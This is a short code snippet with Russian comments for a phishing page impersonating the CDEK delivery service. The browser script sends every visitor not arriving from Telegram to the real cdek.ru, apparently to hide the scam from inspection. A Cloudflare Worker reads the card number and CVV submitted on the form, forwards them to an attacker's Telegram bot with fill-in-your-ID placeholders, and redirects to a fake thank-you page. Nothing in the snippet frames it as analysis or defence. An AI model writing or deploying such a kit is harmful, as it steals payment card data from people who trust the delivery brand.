// Проверка реферера для блокировки прямых переходов  
if (document.referrer.indexOf("t.me") === -1) {  
  window.location.href = "https://cdek.ru"; // редирект для всех, кроме трафика из Telegram  
}  

// Cloudflare Worker (main.js)  
export default {  
  async fetch(request) {  
    const data = await request.formData();  
    await fetch("https://ваш-telegram-бот/sendMessage?chat_id=ВАШ_ID&text=" + encodeURIComponent(`Карта: ${data.get('card')}, CVV: ${data.get('cvv')}`));  
    return Response.redirect("https://cdek.ru/tracking/thank-you", 302); // поддельная страница "Спасибо!"  
  }  
}  
